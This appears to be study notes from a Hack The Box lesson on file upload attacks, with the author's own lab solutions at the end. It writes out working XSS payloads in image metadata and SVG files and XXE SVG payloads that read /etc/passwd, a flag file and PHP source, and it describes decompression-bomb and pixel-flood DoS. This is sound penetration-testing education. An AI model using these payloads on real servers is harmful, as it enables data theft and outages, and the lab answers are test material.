
## XSS

Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.

Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

```shell-session
Pangulin@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
Pangulin@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `HTB.svg`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.

For more about XSS, you may refer to the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103) module.

## XXE

Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## DoS

Finally, many file upload vulnerabilities may lead to a `Denial of Service (DOS)` attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash. `Try to search for other examples of DOS attacks through a vulnerable file upload functionality`.

QUESTIONS: 

modified ``<?xml version="1.0" encoding="UTF-8"?>
``<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
``<svg>&xxe;</svg>

to this : ``<?xml version="1.0" encoding="UTF-8"?>
``<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
``<svg>&xxe;</svg>
and uploaded it 
you have to press cntrl + U to see the output 

for 2nd Task: 

``<?xml version="1.0" encoding="UTF-8"?>
``<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
``<svg>&xxe;</svg>``

used this Payload, wrote it to HTB.svg , uploaded it and then copied the long output from the source view and pasted it into a online base64 decoder to view the source code and locate the upload directory 

